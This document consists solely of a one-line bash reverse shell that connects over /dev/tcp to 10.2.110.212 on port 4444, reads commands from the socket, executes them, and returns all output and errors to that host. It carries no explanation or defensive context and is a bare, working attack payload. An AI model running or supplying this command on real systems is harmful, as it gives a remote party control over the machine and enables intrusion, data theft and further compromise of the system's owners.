
exec 5<>/dev/tcp/10.2.110.212/4444 && cat <&5 | while read line; do $line 2>&5 >&5; done


